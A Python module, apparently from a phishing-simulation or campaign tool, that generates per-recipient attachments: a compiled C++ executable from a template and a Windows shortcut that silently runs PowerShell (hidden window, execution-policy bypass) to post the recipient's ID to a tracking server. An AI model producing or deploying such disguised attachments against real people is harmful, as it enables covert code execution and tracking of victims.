import subprocess
import os
from log import log

def compile_cpp(domain_name, port, user_id, cpp_template_path, output_executable_path):
    log(f"Compilation started...", "INFO")
    try:
        with open(cpp_template_path, 'r', encoding="utf-8") as f:
            cpp_code_template = f.read()
    except FileNotFoundError:
        log(f"File not found {cpp_template_path}", "ERROR")
        return None

    # Заменяем плейсхолдер на фактический user_id
    cpp_code = cpp_code_template.replace("{{USER_ID}}", str(user_id)).replace("{{DOMAIN_NAME}}", domain_name).replace("{{PORT}}", port)

    # Создаем временный файл для C++ кода
    temp_cpp_file = "temp.cpp"  # Лучше использовать tempfile.NamedTemporaryFile
    with open(temp_cpp_file, 'w') as f:
        f.write(cpp_code)

    # Компиляция C++ кода
    compile_command = ["g++", temp_cpp_file, "-o", output_executable_path, "-lws2_32"] 
    compile_process = subprocess.run(compile_command, capture_output=True, text=True)

    if compile_process.returncode != 0:
        log(f"Compilation error:\n{compile_process.stderr}")
        #os.remove(temp_cpp_file) # Удаляем временный файл
        return None

    os.remove(temp_cpp_file) # Удаляем временный файл

from win32com.client import Dispatch

def prepare_lnk(domain_name, port, user_id, output_lnk_path):
    target_path="%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
    parameters = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"(Invoke-WebRequest -Uri 'http://{domain_name}:{port}/api/lnk_executed?q={user_id}' -Method Post).Content\""
    description="Описание ярлыка"
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(output_lnk_path)
    shortcut.Targetpath = target_path
    shortcut.Arguments = parameters
    shortcut.WorkingDirectory = target_path.rsplit('\\', 1)[0]
    shortcut.Description = description
    icon_path="%SystemRoot%\\System32\\SHELL32.dll"
    icon_index=1
    expanded_icon_path = os.path.expandvars(icon_path)
    shortcut.IconLocation = f"{expanded_icon_path},{icon_index}"
    shortcut.save()


def prepare_html():
    return

def generate_payloads(domain_name, port, recipient, target_payload):
    if target_payload.name == "executable_file_runned":
        log(f"Using template {target_payload.template}", "INFO")
        
        compile_cpp(domain_name, port, recipient.id, target_payload.template, target_payload.attachment_path)
        
        log(f"Compilation successful...", "INFO")
        # print(f"stdout:\n{stdout}")
        # print(f"stderr:\n{stderr}")
        # print(f"Return Code: {return_code}")
    elif target_payload.name == "lnk_file_runned":
        log(f"Using template {target_payload.template}", "INFO")
        str = ""
        prepare_lnk(domain_name, port, recipient.id, target_payload.attachment_path)
    else:
        return